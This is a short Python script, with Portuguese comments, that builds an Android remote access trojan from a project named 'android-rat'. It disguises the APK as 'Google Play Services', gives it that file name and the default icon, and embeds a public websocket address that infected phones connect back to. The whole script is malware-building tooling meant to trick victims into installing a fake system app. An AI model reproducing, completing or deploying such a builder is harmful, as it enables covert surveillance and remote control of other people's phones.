import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import gangstar_env
from apk_builder import APKBuilder

PUBLIC_WS = gangstar_env.public_ws_url()

server_dir = os.path.dirname(os.path.abspath(__file__))
project_dir = os.path.join(server_dir, "..", "android-rat")
downloads_dir = os.path.join(server_dir, "downloads")
os.makedirs(downloads_dir, exist_ok=True)

# Usa o ícone padrão do projeto
default_icon = os.path.join(project_dir, "app", "src", "main", "res", "mipmap-xxxhdpi", "ic_launcher.png")
output_apk = os.path.join(downloads_dir, "google-play-services.apk")

print(f"[*] Compilando APK com URL local da maquina: {PUBLIC_WS}")
builder = APKBuilder(project_dir, PUBLIC_WS)
ok = builder.build_custom_apk(
    app_name="Google Play Services",
    icon_path=default_icon,
    output_path=output_apk,
    hide_from_launcher=False
)

if ok:
    print(f"[OK] APK local gerado em: {output_apk}")
    print(f"[OK] Celular vai conectar em: {PUBLIC_WS}")
else:
    print("[ERRO] Falha na compilação.")
